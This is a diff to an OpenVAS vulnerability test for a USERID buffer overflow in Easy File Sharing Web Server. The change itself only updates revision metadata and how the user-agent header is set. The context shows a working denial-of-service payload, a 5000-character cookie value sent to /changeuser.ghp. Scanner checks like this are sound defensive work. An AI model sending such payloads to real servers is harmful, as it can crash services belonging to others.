@@ -1,6 +1,6 @@
 ##############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_easy_file_sharing_server_userid_bof_vuln.nasl 11423 2018-09-17 07:35:16Z cfischer $
+# $Id: gb_easy_file_sharing_server_userid_bof_vuln.nasl 11492 2018-09-20 08:38:50Z mmartin $
 #
 # Easy File Sharing Web Server USERID Buffer Overflow Vulnerability
 #
@@ -29,10 +29,10 @@ CPE = "cpe:/a:efssoft:easy_file_sharing_web_server";
 if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.806516");
-  script_version("$Revision: 11423 $");
+  script_version("$Revision: 11492 $");
   script_tag(name:"cvss_base", value:"5.0");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
-  script_tag(name:"last_modification", value:"$Date: 2018-09-17 09:35:16 +0200 (Mon, 17 Sep 2018) $");
+  script_tag(name:"last_modification", value:"$Date: 2018-09-20 10:38:50 +0200 (Thu, 20 Sep 2018) $");
   script_tag(name:"creation_date", value:"2015-11-19 18:25:40 +0530 (Thu, 19 Nov 2015)");
   script_name("Easy File Sharing Web Server USERID Buffer Overflow Vulnerability");
   script_category(ACT_DENIAL);
@@ -86,12 +86,14 @@ if(http_is_dead(port:http_port)){
 
 host = http_host_name(port:http_port);
 
+useragent = get_http_user_agent();
+
 url = "/changeuser.ghp";
 
 UserID = crap(length:5000, data:"A");
 
 sndReq = 'GET ' + url + ' HTTP/1.1\r\n' +
-         'User-Agent: ' + OPENVAS_HTTP_USER_AGENT + '\r\n' +
+         'User-Agent: ' + useragent + '\r\n' +
          'Host: '+ host + '\r\n' +
          'Referer: http://' + host + '/\r\n' +
          'Cookie: SESSIONID=6771; UserID=' + UserID + '; PassWD=;\r\n' +
